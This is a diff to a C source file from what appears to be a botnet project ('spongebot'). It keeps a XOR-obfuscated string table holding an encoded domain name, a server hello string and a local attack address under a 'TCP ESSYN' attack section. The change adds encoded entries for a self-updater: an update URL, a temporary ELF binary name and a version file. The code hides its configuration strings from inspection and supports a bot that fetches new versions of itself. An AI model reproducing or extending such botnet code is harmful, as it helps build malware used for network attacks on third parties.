@@ -2,7 +2,7 @@
 #include <stdlib.h>
 #include <string.h>
 
-#include <ram_mem.h>
+#include <dict.h>
 
 #define XOR_KEY 0x87f08f33U
 
@@ -16,17 +16,16 @@ void dict_init(void)
         dict[i].value_len = 0;
     }
 
-    dict_add(DICT_DOMAIN_NAME,
-             "\x02\xBD\xC7\xA9\x03\xA1\xC0\xA9\x02"); // domain name
+    dict_add(DICT_DOMAIN_NAME, "\x02\xBD\xC7\xA9\x03\xA1\xC0\xA9\x02");                          // domain name
     dict_add(DICT_SERVER_HELLO, "\x7B\xEA\x9C\xEB\x5C\xAF\xBD\xF5\x1D\xAF\xBB\xF5\x52\xED\x83"); // example: hello server
 
     // TCP ESSYN
-    dict_add(
-        ATK_LOCAL_ADDR,
-        "\x02\xB6\xC2\xA9\x02\xB9\xC8\xA9"); // default:
-                                                                 // 192.168.3.100
+    dict_add(ATK_LOCAL_ADDR, "\x02\xB6\xC2\xA9\x02\xB9\xC8\xA9"); // default: 192.168.3.100
 
-    printf("Address %s\n", dict_get(ATK_LOCAL_ADDR));
+    // http://localhost:3000/version/get
+    dict_add(UPDATER_URL, "\x5B\xFB\x84\xF7\x09\xA0\xDF\xEB\x5C\xEC\x91\xEB\x5B\xE0\x83\xF3\x09\xBC\xC0\xB7\x03\xA0\x86\xE2\x41\xFC\x99\xE8\x5D\xA0\x97\xE2\x47");
+    dict_add(UPDATER_TMP_FILE, "\x40\xFF\x9F\xE9\x54\xEA\x92\xE8\x47");                                         // es: spongebot (elf)
+    dict_add(UPDATER_VER_FILE, "\x50\xFA\x82\xF5\x56\xE1\x84\xD8\x45\xEA\x82\xF4\x5A\xE0\x9E\xA9\x47\xF7\x84"); // current_version.txt
 }
 
 void xor_encrypt_decrypt(char *data, size_t len, uint32_t key)
@@ -53,7 +52,8 @@ void dict_add(int index, const char *value)
         return;
     }
 
-    if (dict[index].value != NULL) {
+    if (dict[index].value != NULL)
+    {
         free(dict[index].value);
     }
 
@@ -89,7 +89,7 @@ char *dict_get(int index)
     }
 
     memcpy(decrypted_value, dict[index].value, dict[index].value_len + 1);
-    
+
     xor_encrypt_decrypt(decrypted_value, dict[index].value_len, XOR_KEY);
 
     return decrypted_value;
